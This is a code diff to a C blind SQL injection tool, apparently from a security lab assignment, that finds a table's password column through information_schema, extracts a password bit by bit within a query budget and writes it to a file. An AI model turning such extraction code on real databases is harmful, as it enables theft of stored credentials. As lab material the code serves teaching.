@@ -293,7 +293,7 @@ bool extract_password(const char *table_name, const char *id_col,
         "SELECT %s FROM %s WHERE %s = '%s'",
         pwd_col, table_name, id_col, MY_ID);
     
-    for (int char_idx = 1; char_idx <= 32; char_idx++) {
+    for (int char_idx = 1; char_idx <= 10; char_idx++) {
         unsigned char current_char = 0;
         
         for (int bit = 7; bit >= 0; bit--) {
@@ -314,7 +314,34 @@ bool extract_password(const char *table_name, const char *id_col,
                char_idx, current_char, (int)current_char, query_counter);
     }
     
-    password[32] = '\0';
+    password[10] = '\0';
+    return true;
+}
+
+/**
+ * Writes the extracted password to a file named [MY_ID].txt.
+ * 
+ * @param password The password string to write
+ * @return true on success, false on error
+ */
+bool write_password_to_file(const char *password) {
+    char filename[64];
+    snprintf(filename, sizeof(filename), "%s.txt", MY_ID);
+    
+    FILE *file = fopen(filename, "w");
+    if (!file) {
+        fprintf(stderr, "Error: Failed to open file %s for writing\n", filename);
+        return false;
+    }
+    
+    if (fprintf(file, "%s", password) < 0) {
+        fprintf(stderr, "Error: Failed to write to file %s\n", filename);
+        fclose(file);
+        return false;
+    }
+    
+    fclose(file);
+    printf("Password written to file: %s\n", filename);
     return true;
 }
 
@@ -323,7 +350,12 @@ bool extract_password(const char *table_name, const char *id_col,
  * 
  * Phase 1: Discovers the table name from information_schema.tables
  * Phase 2: Discovers the ID and password column names from information_schema.columns
- * Phase 3: Extracts the password using the discovered schema information
+ * Phase 3: Extracts the password (1-10 characters) using the discovered schema
+ * Phase 4: Writes the password to [MY_ID].txt
+ * 
+ * Constraints:
+ * - Total queries < 400
+ * - Execution time < 30 seconds
  * 
  * @return 0 on success, 1 on error
  */
@@ -335,17 +367,20 @@ int main(void) {
     char table_name[16] = {0};
     char id_col[16] = {0};
     char pwd_col[16] = {0};
-    char password[64] = {0};
+    char password[16] = {0};
     
     if (!discover_table_name(table_name)) {
+        fprintf(stderr, "Error: Failed to discover table name\n");
         return 1;
     }
     
     if (!discover_column_name(table_name, "id", id_col)) {
+        fprintf(stderr, "Error: Failed to discover ID column\n");
         return 1;
     }
     
     if (!discover_column_name(table_name, "pwd", pwd_col)) {
+        fprintf(stderr, "Error: Failed to discover password column\n");
         return 1;
     }
     
@@ -356,6 +391,7 @@ int main(void) {
     printf("Queries used so far: %d / %d\n", query_counter, MAX_QUERIES);
     
     if (!extract_password(table_name, id_col, pwd_col, password)) {
+        fprintf(stderr, "Error: Failed to extract password\n");
         return 1;
     }
     
@@ -363,5 +399,10 @@ int main(void) {
     printf("Extracted password: %s\n", password);
     printf("Total queries used: %d / %d\n", query_counter, MAX_QUERIES);
     
+    if (!write_password_to_file(password)) {
+        return 1;
+    }
+    
+    printf("\nAttack completed successfully!\n");
     return 0;
 }
